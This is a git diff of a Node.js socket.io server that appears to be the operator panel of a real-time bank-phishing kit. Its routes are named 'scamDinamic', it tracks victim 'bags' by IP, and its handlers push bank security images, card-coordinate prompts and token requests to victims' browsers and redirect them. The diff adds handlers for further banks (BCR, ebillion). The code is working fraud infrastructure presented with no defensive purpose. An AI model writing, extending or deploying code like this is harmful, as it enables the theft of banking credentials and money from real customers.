@@ -7,20 +7,14 @@ import express  from 'express'
 import 'dotenv/config'
 
 import { connectdb } from './db/connectdb.mjs'
-import { verifyToken } from './utils/verifyToken.mjs'
-import { userConnect, userDisconnect } from './utils/connectedUser.mjs'
-
-import { getBagForById } from './controllers/bag/getBagForById.mjs'
-import { bagCreateController } from './controllers/sockets/bag/bagCreateController.mjs'
-import { bagDisconnectController } from './controllers/sockets/bag/bagDisconnectController.mjs'
+import { verifyToken, userConnect, userDisconnect } from './utils/index.mjs'
 
 // routes
 import authRoute from './routes/authRoute.mjs';
-import scamDinamicRoute from './routes/ScamDinamic/scamDinamicRoute.mjs';
-import { getBagForByIp } from './controllers/bag/getBagForId.mjs';
-import { bagConnected } from './controllers/bag/bagConnected.mjs';
-import { createBagId } from './controllers/bag/createBagId.mjs';
-import { createBagIp } from './controllers/bag/createBagIp.mjs';
+import { bagConnected, getBagForById } from './controllers/bag/index.mjs';
+import { bagCreateController } from './controllers/sockets/bag/bagCreateController.mjs';
+import { bagDisconnectController } from './controllers/sockets/bag/bagDisconnectController.mjs';
+import { panelSendRedirect } from './controllers/sockets/live/panelSendRedirect.controller.mjs';
 
 const app = express()
 
@@ -37,25 +31,18 @@ export const io = new Server(httpServer, {
 
 
 app.use(express.static('public'))
-app.post('/', (req, res) => res.json('test'))
 app.use('/auth', authRoute )
-app.use('/scamDinamic', scamDinamicRoute)
 
 
 io.on('connection', async(socket) => {    
     
     if(
-        socket.handshake.headers.origin === ('http://localhost:3000') 
-        || socket.handshake.headers.origin === ('https://huggopanel.com') 
+        socket.handshake.headers.origin === ('http://localhost:3000') || socket.handshake.headers.origin === ('https://huggopanel.com') 
     ) {
         try {
             const [valido, id] = await verifyToken({token: socket.handshake?.query['x-token']})
             
-            if(valido == false){
-                console.log('socket no identificado')
-                socket.emit('[user] logout')
-                return socket.disconnect()
-            }
+            if(valido == false) return socket.disconnect()
 
             await userConnect({ id })
             await socket.join(id)
@@ -63,12 +50,15 @@ io.on('connection', async(socket) => {
             if([...socket.rooms].includes(id)) {
                 const users = await getBagForById({id})
                 socket.emit('[bag] getBag', users)
+                
 
                 socket.on('[bancamiga] getImage', ({ip = '', image = ''}) => {
                     if(ip == '') return
-                    console.log('first')
-                    io.to(ip).emit('[bancamiga] sendImage', {image})
                     return io.to(ip).emit('[bancamiga] sendImage', {image})
+                })
+                socket.on('[bcr] getCoordinates', ({ip = '', coordinate = ''}) => {
+                    if(ip == '') return
+                    return io.to(ip).emit('[bcr] bagCoordinate', {coordinate: coordinate.toString().slice(0,2)})
                 })
 
                 socket.on('[bancamiga] getListImage', ({ip = '', listImage = ''}) => {
@@ -76,11 +66,14 @@ io.on('connection', async(socket) => {
                     return io.to(ip).emit('[bancamiga] sendListImage', {listImage})
                 })
 
-                socket.on('[live] panelSendRedirect', async({ip, urlPage, errorBag}) => {
-                    const bag = await createBagIp({ip})
-                    io.to(bag?.userRef?.toString()).emit('[bag] newBag', bag)
-                    return socket.broadcast.to(ip).emit('[live] bagWaitRedirect', {urlPage, errorBag})
+                socket.on('[ebillion] getMethodToken', ({ip = '', methodToken = ''}) => {
+                    if(ip == '') return
+                    return io.to(ip).emit('[ebillion] sendMethodToken', {methodToken})
                 })
+
+                socket.on('[live] panelSendRedirect', async({ip, nameBank, urlPage, errorBag}) => 
+                    panelSendRedirect({ip, nameBank, urlPage, errorBag, io, socket})
+                )
             }
 
             socket.on('disconnect', async() => {
